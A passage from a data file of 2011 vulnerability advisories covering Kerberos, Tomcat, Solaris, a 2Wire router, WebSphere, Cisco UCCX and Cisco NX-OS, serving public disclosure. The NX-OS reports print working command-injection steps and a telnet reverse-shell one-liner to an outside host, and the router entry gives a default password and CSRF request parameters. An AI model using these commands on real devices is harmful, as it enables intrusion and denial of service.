incidental, consequential, loss of business profits or special damages,
even if Matta Consulting or its suppliers have been advised of the
possibility of such damages.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (GNU/Linux)
iQEcBAEBAgAGBQJO35HHAAoJEKXMIWKFD6qpSrUH/ApJ7WgGlWPEX6pCQTkG36m/
xTkIaLGCaUyA+mkQ4MmHtBjNvd+rgA8B4V/gXOl4n6Cq2OwpuPhIO4ZFZWlKORiU
JMp93glgp96TeozqlR8P+J9zJ+6gJCOtQm74lQkXbd1P914/7PpedOp845/HgA7M
RCsvDDJ4WL2BwOeQAnWWeSYnEOuKiJFZbeRPeIm3dLqsDCy9i9hRdBEdZN5433c5
jzBgF4zSuBn/8B5ebpfnQTqojxPeuasJ6Hfa9cCk71pE1hla2bfc5hcv8XjGavug
IqxWhYyAiyejQfVESf+FVRdhBr8ypz8IzeBlzImyTWZuowMPtP9yZoEQBc7CHgo=
=LnHW
-----END PGP SIGNATURE-----"
11278,MITKRB5-SA-2011-007 KDC null pointer dereference in TGS handling [CVE-2011-1530],,CVE-2011-1530,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
MITKRB5-SA-2011-007
MIT krb5 Security Advisory 2011-007
Original release: 2011-12-06
Last update: 2011-12-06
Topic: KDC null pointer dereference in TGS handling
CVE-2011-1530
KDC null pointer dereference in TGS handling
CVSSv2 Vector: AV:N/AC:L/Au:S/C:N/I:C/A:C/E:H/RL:OF/RC:C
CVSSv2 Base Score: 6.8
Access Vector: Network
Access Complexity: Low
Authentication: Single
Confidentiality Impact: None
Integrity Impact: None
Availability Impact: Complete
CVSSv2 Temporal Score: 5.9
Exploitability: High
Remediation Level: Official Fix
Report Confidence: Confirmed
SUMMARY
=======
In releases krb5-1.9 and later, the KDC can crash due to a null
pointer dereference in code that handles TGS (Ticket Granting Service)
requests. The trigger condition is trivial to produce using
unmodified client software, but requires the ability to authenticate
as a principal in the KDC's realm.
IMPACT
======
An authenticated remote attacker can crash a KDC via null pointer
dereference.
AFFECTED SOFTWARE
=================
* The KDC in krb5-1.9 and later is vulnerable. Earlier releases
predate the internal interface changes that led to this
vulnerability.
FIXES
=====
* Workaround: restart the KDC when it crashes, possibly using an
automated monitoring process.
* Apply the patch:
diff --git a/src/kdc/Makefile.in b/src/kdc/Makefile.in
index f46cad3..102fbaa 100644
- --- a/src/kdc/Makefile.in
+++ b/src/kdc/Makefile.in
@@ -67,6 +67,7 @@ check-unix:: rtest
check-pytests::
$(RUNPYTEST) $(srcdir)/t_workers.py $(PYTESTFLAGS)
+ $(RUNPYTEST) $(srcdir)/t_emptytgt.py $(PYTESTFLAGS)
install::
$(INSTALL_PROGRAM) krb5kdc ${DESTDIR}$(SERVER_BINDIR)/krb5kdc
diff --git a/src/kdc/do_tgs_req.c b/src/kdc/do_tgs_req.c
index c169c54..840a2ef 100644
- --- a/src/kdc/do_tgs_req.c
+++ b/src/kdc/do_tgs_req.c
@@ -243,7 +243,8 @@ tgt_again:
if (!tgs_1 || !data_eq(*server_1, *tgs_1)) {
errcode = find_alternate_tgs(request, &server);
firstpass = 0;
- - goto tgt_again;
+ if (errcode == 0)
+ goto tgt_again;
}
}
status = ""UNKNOWN_SERVER"";
diff --git a/src/kdc/t_emptytgt.py b/src/kdc/t_emptytgt.py
new file mode 100644
index 0000000..1760bcd
- --- /dev/null
+++ b/src/kdc/t_emptytgt.py
@@ -0,0 +1,8 @@
+#!/usr/bin/python
+from k5test import *
+
+realm = K5Realm(start_kadmind=False, create_host=False)
+output = realm.run_as_client([kvno, 'krbtgt/'], expected_code=1)
+if 'not found in Kerberos database' not in output:
+ fail('TGT lookup for empty realm failed in unexpected way')
+success('Empty tgt lookup.')
This patch is also available at
http://web.mit.edu/kerberos/advisories/2011-007-patch.txt
A PGP-signed patch is available at
http://web.mit.edu/kerberos/advisories/2011-007-patch.txt.asc
REFERENCES
==========
This announcement is posted at:
http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2011-007.txt
This announcement and related security advisories may be found on the
MIT Kerberos security advisory page at:
http://web.mit.edu/kerberos/advisories/index.html
The main MIT Kerberos web page is at:
http://web.mit.edu/kerberos/index.html
CVSSv2:
http://www.first.org/cvss/cvss-guide.html
http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2
CVE: CVE-2011-1530
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1530
ACKNOWLEDGMENTS
===============
Simo Sorce discovered this vulnerability.
CONTACT
=======
The MIT Kerberos Team security contact address is
<krbcore-security mit edu>. When sending sensitive information,
please PGP-encrypt it using the following key:
pub 2048R/56CD8F76 2010-12-29 [expires: 2012-02-01]
uid MIT Kerberos Team Security Contact <krbcore-security mit edu>
DETAILS
=======
The process_tgs_req() function in the KDC has logic that attempts to
find an alternative service principal if the service principal in the
client's TGS-REQ is unknown. If the find_alternate_tgs() helper
function returns an error that is not KRB5_KDB_NOENTRY, it leaves the
server variable holding a null pointer. The process_tgs_req()
function improperly ignores that error, and proceeds to call functions
that dereference the null pointer.
Prior to krb5-1.9, the krb5_db_get_principal() function and related
interfaces had output parameters ""more"" and ""nprincs"". The krb5-1.9
release includes changes to these interfaces so that they no longer
have those outputs. Prior to krb5-1.9, the find_alternate_tgs()
function in the KDC had a void return type, and indicated failure by
setting its ""more"" and ""nprincs"" outputs appropriately. Its interface
changed in krb5-1.9 to instead return an error code, with
corresponding changes to process_tgs_req(); these changes to
process_tgs_req() were flawed and allow errors other than
KRB5_KDB_NOENTRY to cause a null pointer dereference.
The vulnerable code executes after the KDC authenticates the request,
so an attacker must have first obtained valid initial Kerberos
credentials for the target realm.
REVISION HISTORY
================
2011-12-06 original release
Copyright (C) 2011 Massachusetts Institute of Technology
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (SunOS)
iQCVAgUBTt5mYabDgE/zdoE9AQIuKAQA0K1YUeTKjEIVjEIufpTanNoipQiWRNCE
alUjkcxQeD3yFK8LU6yKcs0CdTI60FDst3788tUtoGDdwpnbc90Rv8EID00VtgEc
0rI4Nfe32MxP/UlNNVRinWkwtDLWeh1gKQOPXAjeapKQcWAFB3tM/haRnDgCu49I
snM0jQSBFgA=
=FK9G
-----END PGP SIGNATURE-----"
11435,[SECURITY] CVE-2011-3376 Apache Tomcat - Privilege Escalation via Manager app,,CVE-2011-3376,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2011-3376 Apache Tomcat - Privilege Escalation via Manager app
Severity: Low
Vendor: The Apache Software Foundation
Versions Affected:
- - Tomcat 7.0.0 to 7.0.21
Description:
This issue only affects environments running web applications that are
not trusted (e.g. shared hosting environments). The Servlets that
implement the functionality of the Manager application that ships with
Apache Tomcat should only be available to Contexts (web applications)
that are marked as privileged. However, this check was not being made.
This allowed an untrusted web application to use the functionality of
the Manager application. This could be used to obtain information on
running web applications as well as deploying additional web applications.
Mitigation:
Users of Tomcat 7.0.x should upgrade to 7.0.22 or later
Credit:
This issue was identified by Ate Douma
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-7.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
iQIcBAEBAgAGBQJOuWxPAAoJEBDAHFovYFnng3oP/jkYsplqxz9hjWi6uztQK3Gv
BlS1IlbyqW5HW8rqr/pyfLWDDiJZUc+FmWRbyT96r/V4z0w4oGglGi289owLr1Lx
bsGlauWQhZh7k5nWKboMVEk6CjGOXVQ9zMJJwhEkrXn6/HNV5O65F/0nnLoHgStM
DNyKKpYDtc6XCI7+Pcutv3fqkk9niF3KSF3rePKlpUstVbuLx9HlX+0fbj7+X4w/
PyE5R9tVfr3Toiwn546QQR73VkOSmAGt0IEE9P06oY50ruW3/Z6wJjVHrlJUsoQ3
txupoC+FCZ5ph8DfoeVzav6Y3W9dImXz6rzxm3YnUKCDZuWnGVNzDE4IUyKdRM5t
W/Smquaat8VxsxMbU34bSJHYA1m2nos4qPrQvJl2w0wKWrPFRnu4f8RImvg1BIPH
gZ17raqPjdoBuE3H4ivgF0DSasVdYM/Ge977B+6nD9jzwE6FEFAFCCRpbYvD/6SA
//QbqSlcULb6CKZ6D/rNbLSQ3e0QD6GYaz3HjJcCtJkqo2FoLGY88AxtoF4es5SB
thYJf7r51J9W8g7nvw+b7Y0+eG3IczsBA0spIoyzIKr1RxSEFE2220idPdotpjAf
aticEwF9U5przWmwNab7lKUd91bo32ZVtvIprPGL/NfHrL3KC891gjYqkQtrcJC5
SkiQ74ix/uGZTB6HHCWm
=wak3
-----END PGP SIGNATURE-----"
11465,NGS00042 Technical Advisory: Solaris 11 USB hub class descriptor kernel stack overflow (CVE-2011-2295),,CVE-2011-2295,"=======
Summary
=======
Name: Solaris 11 USB hub class descriptor kernel stack overflow
Release Date: 2 November 2011
Reference: NGS00042
Discoverer: Andy Davis <andy.davis ngssecure com>
Vendor: Oracle
Vendor Reference:
Systems Affected: Solaris 8, 9, 10, and 11 Express
Risk: High
Status: Published
========
TimeLine
========
Discovered: 27 January 2011
Released: 27 January 2011
Approved: 27 January 2011
Reported: 27 January 2011
Fixed: 19 July 2011
Published: 2 November 2011
===========
Description
===========
A local attacker can send a malformed USB hub class descriptor via a malicious USB device and trigger a kernel stack overflow
=================
Technical Details
=================
If the wMaxPacketSize field within a USB hub class Endpoint descriptor is set to a value >= 0x1125, it causes a kernel stack overflow
Jan 27 13:36:59 solaris ^Mpanic[cpu1]/thread=d742ada0:
Jan 27 13:36:59 solaris genunix: [ID 549817 kern.notice] segkp_fault: accessing redzone
Jan 27 13:36:59 solaris unix: [ID 100000 kern.notice] Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742a540
genunix:segkp_fault+238 (d1061f68, fec24c20,) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742a590 unix:segkmem_fault+8e (d1061f68,
fec24c60,) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742a630
genunix:as_fault+4c1 (d1061f68, fec23da0,) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742a690 unix:pagefault+1ac (d23bd000, 0, 1, 1) Jan
27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742a740 unix:trap+136f (d742a754, d23bd000,) Jan 27 13:36:59 solaris genunix: [ID 353471
kern.notice] d742a754 unix:_cmntrap+7c (fea501b0, d1010000,) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742a7c8
ehci:ehci_calculate_bw_availability_mask+48 (d2089000, 2892, 0, ) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742a838
ehci:ehci_find_bestfit_hs_mask+c8 (d2089000, d742a8fa,) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742a888
ehci:ehci_allocate_high_speed_bandwidth+126 (d2089000, d6c84be0,) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742a8b8
ehci:ehci_allocate_bandwidth+21 (d2089000, d6c84be0,) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742a918 ehci:ehci_hcdi_pipe_open+dd
(d6c84be0, 0, d742a9) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742a968
usba:usb_pipe_open+260 (d1d01cf0, d851ec70,) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742a998
usba:hubd_open_intr_pipe+37 (d851ec40, 0, d742a9) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742a9c8
usba:hubd_check_ports+f0 (d851ec40, d1d01cf0,) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742aa38 usba:usba_hubdi_attach+43a (d1d01cf0,
0, 0, 0) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742aa68
genunix:devi_attach+a5 (d1d01cf0)
Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742aa88 genunix:attach_node+9a (d1d01cf0, 1, d2076c) Jan 27 13:36:59 solaris genunix: [ID
353471 kern.notice] d742aab8
genunix:i_ndi_config_node+c1 (d1d01cf0, 6, 0, d1d) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742aad8 genunix:i_ddi_attachchild+3d
(d1d01cf0, 0, d742aa) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742aaf8 genunix:devi_attach_node+bb (d1d01cf0, 1020008, ) Jan 27
13:36:59 solaris genunix: [ID 353471 kern.notice] d742ab38
genunix:config_immediate_children+e6 (d17f3340, 1020008, ) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742ab78
genunix:ndi_busop_bus_config+74 (d17f3340, 1020008, ) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742ac18 usba:hubd_bus_config+dc
(d17f3340, 1020008, ) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742ac48
genunix:devi_config_common+74 (d17f3340, 1020008, ) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742ac68
genunix:ndi_devi_config+13 (d17f3340, 1020008) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742aca8 genunix:ndi_devi_online+fc (d17f3340,
0, 0, f8a) Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742ad18 usba:hubd_hotplug_thread+52b (e0553c50, d1db8b9c,) Jan 27 13:36:59 solaris
genunix: [ID 353471 kern.notice] d742ad88
genunix:taskq_d_thread+a3 (d3b94410, 0)
Jan 27 13:36:59 solaris genunix: [ID 353471 kern.notice] d742ad98
unix:thread_start+8 ()
===============
Fix Information
===============
This issue is addressed in the Oracle Critical Patch Update Advisory - July 2011, which is available at the following URL:
http://www.oracle.com/technetwork/topics/security/cpujuly2011-313328.html
NGS Secure Research
http://www.ngssecure.com"
11474,CVE-2011-3682: 2WIRE-SINGTEL 2701HGV-E/2700HGV-2/2700HG GATEWAY ROUTER MANAGEMENT AND DIAGNOSTIC CONSOLE VULNERABILITY,,CVE-2011-3682,"CVE-2011-3682: 2WIRE-SINGTEL 2701HGV-E/2700HGV-2/2700HG GATEWAY ROUTER MANAGEMENT AND DIAGNOSTIC CONSOLE VULNERABILITY
1. BACKGROUND AND AFFECTED MODELS/FIRMWARE
SingTel provides customized versions of 2Wire gateway routers to its Internet service subscribers for the purpose of accessing the web.
Customized firmware at major version 5 (or below) contains a Management and Diagnostic Console (MDC) at http://192.168.1.254/mdc (when accessing from a device connected to the router) for SingTel engineers to perform setup and debugging procedures.
While the vulnerability is known to be patched in major version 6 (and above) of the firmware, it is likely that a high number of SingTel Internet service customers are still on the outdated firmware as there is no firmware upgrade procedure available to these subscribers.
2. VULNERABILITY
The MDC has its default password set as �2wire�. As opposed to the user panel at http://192.168.1.254, this password cannot be changed.
Although the site is only accessible through devices on the local subnet of the router, when combined with the lack of Cross-Site Request Forgery (CSRF) protection, the vulnerability allows attackers to alter the router�s settings for malicious purposes.
3. EXPLOIT
The exploit can be delivered through a HTML page served to the victim. Then, the maliciously crafted page can instruct the victim�s browser to send a POST request, meant to execute changes in the MDC, via XMLHttpRequest or a populated and automatically submitted form in JavaScript.
For instance, in the proof-of-concept, which reboots the router when served to a client connected to a vulnerable router, a form is POST to http://192.168.1.254/xslt with the following parameters:
PAGE = S01_POST,
view = XML,
THISPAGE = J21,
NEXTPAGE = J21_REBOOT,
PASSWORD = 2wire
4. IMPACTS AND ADVISORY
A successful attack is unlikely to be noticed by the end-user with the lack of warning that comes with a CSRF attack, especially when performed through XMLHttpRequest. A likely exploitation would involve the alteration of the victim router�s Domain Name System (DNS) records, enabling a Man-in-the-Middle (MITM) attack vector. This allows for severe Advanced Persistent Threats (APT) to the victim.
Hence, it is advised for SingTel and 2Wire to push the updated firmware to its subscribers as soon as possible.
While the issue is pending resolution, SingTel Internet service customers with firmware major version 5 (and below) are advised to:
- Avoid visiting any website that is not previously trusted, especially web search results and links on social networking sites
- Pay increased attention to any anomalies in Internet service, such as substantial increase in page-load durations
5. DISCLOSURE AND NOTES
Attempt has been made to contact SingTel about the vulnerability through SingCERT on 14 September 2011. While confirmation of vulnerability has been received, no plan to fix the vulnerability has been made known before the 31 October 2011 deadline specified.
TAN SZE CHUEN
Security Researcher
tan szechuen com (PGP key available)
Updates and Proof-of-Concept at http://blog.szechuen.com/cve-2011-3682"
11475,DDIVRT-2011-33 IBM WebSphere Application Server 'help' Servlet Plug-in Bundle Directory Traversal [CVE-2011-1359],,CVE-2011-1359,"Title
-----
DDIVRT-2011-33 IBM WebSphere Application Server 'help' Servlet Plug-in Bundle Directory Traversal [CVE-2011-1359]
Severity
--------
High
Date Discovered
---------------
July 28, 2011
Discovered By
-------------
Digital Defense, Inc. Vulnerability Research Team
Credit: Javier Castro, sxkeebler and r@b13$
Vulnerability Description
-------------------------
The default installation of the IBM WebSphere Application Server is
deployed with a 'help' servlet which is designed to serve supporting
documentation for the WebSphere system. When the 'help' servlet
processes a URL that contains a reference to a Java plug-in Bundle
that is registered with the Eclipse Platform Runtime Environment of
the WebSphere Application Server, the 'help' servlet fails to ensure
that the submitted URL refers to a file that is both located within the
web root of the servlet and is of a type that is allowed to be served.
An unauthenticated remote attacker can use this weakness in the
'help' servlet to retrieve arbitrary system files from the host that
is running the 'help' servlet. This can be accomplished by submitting
a URL which refers to a registered Java plug-in Bundle followed by a
relative path to the desired file.
Solution Description
--------------------
IBM has released a patch for this issue. The patch is available through APAR PM45322.
http://www-01.ibm.com/support/docview.wss?uid=swg21509257
Tested Systems / Software (with versions)
------------------------------------------
WebSphere Application Server Version 8.0
WebSphere Application Server Version 7.0
WebSphere Application Server Version 6.1
Vendor Contact
--------------
Vendor Name: IBM
Vendor Website: http://www-01.ibm.com/software/webservers/appserv/was/library/"
11500,"RE: [CVE-2011-2569] Cisco Nexus OS (NX-OS) - Command ""injection"" / sanitization issues.",,CVE-2011-2569,"Hello,
This is Paul Oxman with Cisco PSIRT.
Please confirms the vulnerability reported by Peter Adkins,
and has published an Intellishield response
http://tools.cisco.com/security/center/viewAlert.x?alertId=24458
Additional information below. For current updates to Cisco PSIRT
response, please see the Intellishield response URL stated above.
---------------------------------------------------------------------
NX-OS - ""less"" sub-command - Command injection / sanitization issues.
---------------------------------------------------------------------
Affected Products:
==================
The following products are affected by this vulnerability:
+-----------------------------------------------------------------+
| Affected Product | Cisco Bug | First Fixed |
| | ID | Release |
|-----------------------------------+------------+----------------|
| Cisco Nexus 7000 Series Switches | CSCtf40008 | 4.2(6) |
| | | 5.1(1) |
|-----------------------------------+------------+----------------|
| Cisco Nexus 5000 Series Switches | CSCtf40008 | 4.2(1)N2(1) |
|-----------------------------------+------------+----------------|
| Cisco Nexus 4000 Series Switches | CSCtf40008 | Vulnerable |
| | | Upcoming 1H |
| | | Release |
|-----------------------------------+------------+----------------|
| Cisco Nexus 2000 Series Switches | CSCtf40008 | 4.1(1)N2(1) |
|-----------------------------------+------------+----------------|
| Cisco Nexus 1000V Series Switches | CSCtf40008 | 4.2(1)SV1(5.1) |
|-----------------------------------+------------+----------------|
| Cisco MDS 9000 Software | CSCtf40008 | 4.2(6) |
| | | 5.1(1) |
|-----------------------------------+------------+----------------|
| Cisco Unified Computing System | CSCtg18363 | 1.3(1c) |
| | | 1.4(1i) |
+-----------------------------------------------------------------+
The following are not affected by the ""less"" sub-command - command
injection vulnerability.
* Cisco Nexus 3000 Series Switches
CVSS Scores:
Nexus Products: AV:L/AC:L/Au:S/C:P/I:P/A:C/E:F/RL:OF/RC:C (5.7/4.7)
UCSM: AV:L/AC:L/Au:S/C:C/I:C/A:C/E:F/RL:OF/RC:C (6.8/5.6)
------------------------------------------------------------------------
NX-OS - ""section"" sub-command - Command injection / sanitization issues.
------------------------------------------------------------------------
Affected Products:
==================
The following products are affected by this vulnerability:
+--------------------------------------------------------------+
| Affected Product | Cisco Bug | First Fixed |
| | ID | Release |
|-----------------------------------+------------+-------------|
| Cisco Nexus 7000 Series Switches | CSCtr44645 | 5.2(1) |
|-----------------------------------+------------+-------------|
| Cisco Nexus 5000 Series Switches | CSCtr44645 | 5.1(3)N1(1) |
|-----------------------------------+------------+-------------|
| Cisco Nexus 4000 Series Switches | CSCts10195 | Vulnerable |
| | | Upcoming 1H |
| | | Release |
|-----------------------------------+------------+-------------|
| Cisco Nexus 3000 Series Switches | CSCts10188 | 5.0(3)U2(1) |
|-----------------------------------+------------+-------------|
| Cisco Nexus 2000 Series Switches | CSCtr44645 | 5.1(3)N1(1) |
|-----------------------------------+------------+-------------|
| Cisco MDS 9000 Software | CSCtr44645 | 5.2(1) |
|-----------------------------------+------------+-------------|
| Cisco Unified Computing System | CSCtg18363 | 2.0(1m) |
|-----------------------------------+------------+-------------|
The following products are not affected by the ""section"" sub-command
- command injection vulnerability
* Cisco Nexus 1000V Series Switches
CVSS Scores:
Nexus Products: AV:L/AC:L/Au:S/C:P/I:P/A:C/E:F/RL:OF/RC:C (5.7/4.7)
UCSM: AV:L/AC:L/Au:S/C:C/I:C/A:C/E:F/RL:OF/RC:C (6.8/5.6)
Regards
Paul Oxman
PSIRT Incident Manager
poxman cisco com
Phone: +65 6317 7418
Pager: poxman epage cisco com
Cisco Systems, Inc. Singapore
Cisco.com - http://www.cisco.com/global/SG/ PGP Key: 0x6EA839A6
Have you seen the Security Intelligence Operations Portal http://www.cisco.com/security
Have you seen the new Cisco Security Blog:
http://blogs.cisco.com/security
This email may contain confidential and privileged material for the sole use of the intended recipient. Any review, use, distribution or disclosure by others is strictly prohibited. If you are not the intended recipient (or authorized to receive for the recipient), please contact the sender by reply email and delete all copies of this message.
For corporate legal information go to:
http://www.cisco.com/web/about/doing_business/legal/cri/index.html
* Paul Raymond Oxman <poxman cisco com>
* 0x6EA839A6
-----Original Message-----
From: 0x9950 gmail com [mailto:0x9950 gmail com]
Sent: Saturday, October 22, 2011 4:14 PM
To: bugtraq securityfocus com
Subject: [CVE-2011-2569] Cisco Nexus OS (NX-OS) - Command ""injection"" / sanitization issues.
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Cisco Nexus OS (NX-OS) - Command ""injection"" / sanitization issues.
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Discovery by:
1) Peter Adkins <adkins.peter gmail com>
Access:
1) Local; authenticated access is required.
CVE-ID:
1) CVE-2011-2569
OS' Affected:
1) Cisco Nexus OS (NX-OS)
Vendor involvement:
1) Alerted - patches available / implemented for some platforms.
Systems / platforms affected:
1) Nexus 7000
2) Nexus 5000
3) Nexus 4000
4) Nexus 3000
5) Nexus 2000
6) Nexus 1000V
7) MDS
8) UCS
Notes:
1) Local access is required. However, unprivileged accounts can gain
access to the underlying Linux operating system, effectively providing
complete access to the device. This could potentially lead to issues
in environments where NOC and other staff are permitted low-level access
for first point of call, etc.

-----------------------------------------------------------------------------
NX-OS - ""section"" sub-command - Command injection / sanitization issues.
-----------------------------------------------------------------------------
This issue was found on the Nexus 7000 platform. It is believed to
also affect the following platforms:
* Nexus 7000 ( OS < 5.2(1.61)S0 5.2(1)S73 5.2(1)S72 )
* Nexus 5000 ( OS < UNK )
* Nexus 4000 ( OS < UNK )
* Nexus 3000 ( OS < UNK )
* Nexus 2000 ( OS < UNK )
* MDS ( OS < 5.2(1.61)S0 5.2(1)S73 5.2(1)S72 )
The section command appears to be an AWK script to which the requested
string is passed. However, the input does not appear to be sanitized
correctly. As a result, AWK can be used to execute arbitrary commands on the
Linux subsystem.
nx1# sh clock | sed 's/.*/BEGIN { system(""id"") }/' > 20110713.awk
Warning: There is already a file existing with this name. Do you want to
overwrite (yes/no)? [no] y
nx1# sh clock | sec '* -f /bootflash/20110713.awk '
uid=2003(user) gid=504(network-operator)
11:16:04.082 UTC Wed Jul 13 2011
nx1# sh clock | sed 's/.*/BEGIN { system(""ls /mnt/cfg/0/"") }/'
> 20110713.awk
nx1# sh clock | sec '* -f /bootflash/20110713.awk '
ascii
bin
boot
cfglabel.sysmgr
debug
licenses
linux
log
lost+found
11:18:41.885 UTC Wed Jul 13 2011
This can even be used to remove all files on the bootflash and issue a
'reboot' command to the system. However, rebooting from the Linux subsystem
causes the device to spew messages to the console and lock; rather than
actually reloading the device.
-----------------------------------------------------------------------------
NX-OS - ""less"" sub-command - Command injection / sanitization issues.
-----------------------------------------------------------------------------
Believed to affect the following versions of software:
1) Nexus 7000 ( OS < 5.1(1) )
2) Nexus 5000 ( OS < 4.2(1)N2(1) )
3) Nexus 4000 ( OS < UNK)
4) Nexus 2000 ( OS < 4.2(1)N2(1) )
5) UCS* ( OS < 1.4(1i) 1.3(1c) )
6) Nexus 1000V ( OS < UNK )
7) MDS ( OS < 5.1(1) )
* On the UCS platform commands injected are executed as root.
As an example:
switch# sh clock | less
Once less is presented we open files by pressing colon and then ""e"" and
specifying the path to the file.
bin:*:1:1:bin:/bin:
daemon:*:2:2:daemon:/usr/sbin:
sys:*:3:3:sys:/dev:
ftp:*:15:14:ftp:/var/ftp:/isanboot/bin/nobash
ftpuser:UvdRSOzORvz9o:99:14:ftpuser:/var/ftp:/isanboot/bin/nobash
nobody:*:65534:65534:nobody:/home:/bin/sh
admin:x:2002:503::/var/home/admin:/isan/bin/vsh_perm
However, this is just read-only access once again. BUT, if we use the ""|""
(pipe) and then ""$"" key macro, we can execute commands.
!ls -lah > /bootflash/20110715
As shown below, the file has been created on the boot-flash.
switch# dir
97 Jul 15 12:01:44 2011 20110715
Using this method, I have been able to establish a remote shell into the
NX-OS Linux subsystem using the following:
mknod rs p; telnet ad.dr.es.s 8888 0<rs | /bin/bash 1>rs
Even the reboot command is accepted as a valid input. However, rather than
rebooting the device, it causes the system to lock while spewing errors
to the console.
switch# sh clock | less
Fri Jul 15 12:06:30 UTC 2011
!reboot
Broadcast message from root (Fri Jul 15 12:06:39 2011):"
11508,DDIVRT-2011-35 Cisco Unified Contact Center Express Directory Traversal [CVE-2011-3315],,CVE-2011-3315,"Title
-----
DDIVRT-2011-35 Cisco Unified Contact Center Express Directory Traversal [CVE-2011-3315]
Severity
--------
High
Date Discovered
---------------
August 9, 2011
Discovered By
-------------
Digital Defense, Inc. Vulnerability Research Team
Credit: r@b13$
Vulnerability Description
-------------------------
The default deployment of Cisco Unified Contact Center
Express (UCCX) system is configured with multiple listening
services. The web service that is listening on TCP port 9080,
or on TCP port 8080 in versions prior to 8.0(x), serves a
directory which is configured in a way that allows for a remote
unauthenticated attacker to retrieve arbitrary files from the
UCCX root filesystem through a directory traversal attack. It is
possible for an attacker to use this vector to gain console
access to the vulnerable node as the 'ccxcluster' user, and
subsequently escalate privileges.
Solution Description
--------------------
Cisco has released a patch for this vulnerability. Information
regarding the software update which addresses this issue is available at:
http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20111026-uccx
Tested Systems / Software
-------------------------
Cisco Unified Contact Center Express (UCCX) versions: 8.5(x), 8.0(x), 7.0(x), 6.0(x)
Cisco Unified IP Interactive Voice Response (Unified IP-IVR) versions: 8.5(x), 8.0(x), 7.0(x), 6.0(x)
Vendor Contact
--------------
Vendor Name: Cisco
Vendor Website: http://www.cisco.com/"
11549,"[CVE-2011-2569] Cisco Nexus OS (NX-OS) - Command ""injection"" / sanitization issues.",,CVE-2011-2569,"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Cisco Nexus OS (NX-OS) - Command ""injection"" / sanitization issues.
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Discovery by:
1) Peter Adkins <adkins.peter gmail com>
Access:
1) Local; authenticated access is required.
CVE-ID:
1) CVE-2011-2569
OS' Affected:
1) Cisco Nexus OS (NX-OS)
Vendor involvement:
1) Alerted - patches available / implemented for some platforms.
Systems / platforms affected:
1) Nexus 7000
2) Nexus 5000
3) Nexus 4000
4) Nexus 3000
5) Nexus 2000
6) Nexus 1000V
7) MDS
8) UCS
Notes:
1) Local access is required. However, unprivileged accounts can gain
access to the underlying Linux operating system, effectively providing
complete access to the device. This could potentially lead to issues
in environments where NOC and other staff are permitted low-level access
for first point of call, etc.

-----------------------------------------------------------------------------
NX-OS - ""section"" sub-command - Command injection / sanitization issues.
-----------------------------------------------------------------------------
This issue was found on the Nexus 7000 platform. It is believed to
also affect the following platforms:
* Nexus 7000 ( OS < 5.2(1.61)S0 5.2(1)S73 5.2(1)S72 )
* Nexus 5000 ( OS < UNK )
* Nexus 4000 ( OS < UNK )
* Nexus 3000 ( OS < UNK )
* Nexus 2000 ( OS < UNK )
* MDS ( OS < 5.2(1.61)S0 5.2(1)S73 5.2(1)S72 )
The section command appears to be an AWK script to which the requested
string is passed. However, the input does not appear to be sanitized
correctly. As a result, AWK can be used to execute arbitrary commands on the
Linux subsystem.
nx1# sh clock | sed 's/.*/BEGIN { system(""id"") }/' > 20110713.awk
Warning: There is already a file existing with this name. Do you want to
overwrite (yes/no)? [no] y
nx1# sh clock | sec '* -f /bootflash/20110713.awk '
uid=2003(user) gid=504(network-operator)
11:16:04.082 UTC Wed Jul 13 2011
nx1# sh clock | sed 's/.*/BEGIN { system(""ls /mnt/cfg/0/"") }/'
> 20110713.awk
nx1# sh clock | sec '* -f /bootflash/20110713.awk '
ascii
bin
boot
cfglabel.sysmgr
debug
licenses
linux
log
lost+found
11:18:41.885 UTC Wed Jul 13 2011
This can even be used to remove all files on the bootflash and issue a
'reboot' command to the system. However, rebooting from the Linux subsystem
causes the device to spew messages to the console and lock; rather than
actually reloading the device.
-----------------------------------------------------------------------------
NX-OS - ""less"" sub-command - Command injection / sanitization issues.
-----------------------------------------------------------------------------
Believed to affect the following versions of software:
1) Nexus 7000 ( OS < 5.1(1) )
2) Nexus 5000 ( OS < 4.2(1)N2(1) )
